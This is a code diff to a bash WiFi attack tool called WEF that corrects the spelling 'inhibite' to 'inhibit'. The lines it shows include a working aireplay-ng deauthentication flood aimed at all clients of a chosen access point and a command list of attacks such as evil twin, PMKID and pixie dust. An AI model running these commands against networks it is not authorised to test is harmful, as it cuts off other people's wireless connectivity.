@@ -72,7 +72,7 @@ function evil_c(){
 	back="1"
 }
 
-# Ctrl + C for inhibite AP's
+# Ctrl + C for inhibit AP's
 function inhibition_c(){
 	sleep 0.1
 	# Kill deauth process
@@ -834,16 +834,16 @@ function inhibitor(){
 
 	echo -e "\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Getting channel of the AP${endColour}"
 	ask_data2
-	channel_to_inhibite=$(timeout 25 bash -c "wash -2 -5 -s -a -i ${netCard}" | grep -i "${ap_to_inhibite}$" | head -n 1 | awk '{print $2}')
+	channel_to_inhibit=$(timeout 25 bash -c "wash -2 -5 -s -a -i ${netCard}" | grep -i "${ap_to_inhibit}$" | head -n 1 | awk '{print $2}')
 
 	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting inhibition${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"
-	iwconfig ${netCard} channel ${channel_to_inhibite}
+	iwconfig ${netCard} channel ${channel_to_inhibit}
 	echo -ne "\n\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Press Ctrl + C to stop attack${endColour} "
 	if [ "$verbose" == "0" ]; then
-		aireplay-ng -0 0 -e "${ap_to_inhibite}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
+		aireplay-ng -0 0 -e "${ap_to_inhibit}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
 	elif [ "$verbose" == "1" ]; then
 		echo
-		aireplay-ng -0 0 -e "${ap_to_inhibite}" -c FF:FF:FF:FF:FF:FF ${netCard}
+		aireplay-ng -0 0 -e "${ap_to_inhibit}" -c FF:FF:FF:FF:FF:FF ${netCard}
 	fi
 	sleep 0.1
 	echo -e "\n\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Inhibition completed${endColour}"
@@ -1604,7 +1604,7 @@ function listHelp(){
 	echo -e "${blueColour} \tload <module_name>\t- Load a different module${endColour}"
 	echo -e "${blueColour} \thosts\t\t\t- Perform a fast and stealthy host scan${endColour}"
 	echo -e "${blueColour} \thelp/?\t\t\t- Print this help panel${endColour}"
-	echo -e "${blueColour} \tinhibite <ap_name>\t- Inhibite an AP until you press Ctrl + C${endColour}"
+	echo -e "${blueColour} \tinhibit <ap_name>\t- Inhibit an AP until you press Ctrl + C${endColour}"
 	echo -e "${blueColour} \textra\t\t\t- Print a list of extra commands and utilities${endColour}"
 	echo -e "${blueColour} \tinfo\t\t\t- Show info about your network adapter${endColour}"
 	echo -e "${blueColour} \tverbose\t\t\t- Set verbose on, to see more output${endColour}"
@@ -2006,7 +2006,7 @@ echo -e "        (_(__/  ./     /                    \_\      \.		"
 echo -e "               (_(___/                         \_____)_)		${endColour}"
 }
 
-words=("help" "randomize mac" "attacks" "deauth" "beacon" "deauthentication" "caffe-latte" "authentication" "auth" "pmkid" "pmkid attack" "start card" "pmkid-attack" "beacon-flood" "beaconflood" "michael" "start" "up" "exit" "quit" "salir" "sortir" "1" "2" "3" "4" "5" "6" "7" "8" "9" "10" "11" "12" "13" "14" "15" "16" "evil" "evil-twin" "eviltwin" "chopchop" "replay" "replay attack" "beacon flood" "deauth attack" "deauth-attack" "deauthentication-attack" "evil-twin-attack" "authentication attack" "deauthentication attack" "randomize" "mac" "passive" "passive attack" "stealthy" "stealthy attack" "stealthy-attack" "passive-attack" "randomize-mac" "info" "pixie dust" "pixie" "pixie-dust" "replay-attack" "exec" "command" "execute" "exi" "qui" "chopchop attack" "chopchop-attack" "michael attack" "michael-attack" "wef" "WEF" "secret" "99" "modules" "load bluetooth" "load wifi" "clear" "panel" "scan" "chipsets" "adapters" "info" "evil twin" "tip" "tips" "?" "inhibite" "inhibitor" "cls" "verbose" "noverbose" "Deauthentication" "Authentication" "PMKID" "Beacon" "Beacon Flood" "Michael" "Michael Exploitation" "Passive" "Stealthy" "Start" "Pixie" "Pixie Dust" "PixieDust" "Caffe-Latte" "Caffe Latte" "CaffeLatte" "ChopChop" "Evil" "Evil Twin" "EvilTwin" "Evil-Twin" "Null" "Null Pin" "Replay" "Replay Attack" "Randomize" "version" "null" "enable auto" "enable" "disable auto" "disable" "extra" "update" "gps" "b" "d" "a" "e" "r" "n" "m" "banner")
+words=("help" "randomize mac" "attacks" "deauth" "beacon" "deauthentication" "caffe-latte" "authentication" "auth" "pmkid" "pmkid attack" "start card" "pmkid-attack" "beacon-flood" "beaconflood" "michael" "start" "up" "exit" "quit" "salir" "sortir" "1" "2" "3" "4" "5" "6" "7" "8" "9" "10" "11" "12" "13" "14" "15" "16" "evil" "evil-twin" "eviltwin" "chopchop" "replay" "replay attack" "beacon flood" "deauth attack" "deauth-attack" "deauthentication-attack" "evil-twin-attack" "authentication attack" "deauthentication attack" "randomize" "mac" "passive" "passive attack" "stealthy" "stealthy attack" "stealthy-attack" "passive-attack" "randomize-mac" "info" "pixie dust" "pixie" "pixie-dust" "replay-attack" "exec" "command" "execute" "exi" "qui" "chopchop attack" "chopchop-attack" "michael attack" "michael-attack" "wef" "WEF" "secret" "99" "modules" "load bluetooth" "load wifi" "clear" "panel" "scan" "chipsets" "adapters" "info" "evil twin" "tip" "tips" "?" "inhibit" "inhibitor" "cls" "verbose" "noverbose" "Deauthentication" "Authentication" "PMKID" "Beacon" "Beacon Flood" "Michael" "Michael Exploitation" "Passive" "Stealthy" "Start" "Pixie" "Pixie Dust" "PixieDust" "Caffe-Latte" "Caffe Latte" "CaffeLatte" "ChopChop" "Evil" "Evil Twin" "EvilTwin" "Evil-Twin" "Null" "Null Pin" "Replay" "Replay Attack" "Randomize" "version" "null" "enable auto" "enable" "disable auto" "disable" "extra" "update" "gps" "b" "d" "a" "e" "r" "n" "m" "banner")
 
 parameters=("$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$9")
 
@@ -2483,11 +2483,11 @@ if [ "$(id -u)" == "0" ]; then
 				fi
 			fi
 
-			if [ "$(echo $option | awk '{print $1}')" == "inhibite" ] && [ "$(echo $option | awk '{print $2}')" ]; then
+			if [ "$(echo $option | awk '{print $1}')" == "inhibit" ] && [ "$(echo $option | awk '{print $2}')" ]; then
 				correct_counter="3"
 				mon_check=$(check_interface_mode)
 				if [ "$mon_check" == "monitor" ]; then
-					ap_to_inhibite=$(echo "${option}" | awk '{print $2}')
+					ap_to_inhibit=$(echo "${option}" | awk '{print $2}')
 					inhibitor
 				else
 					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
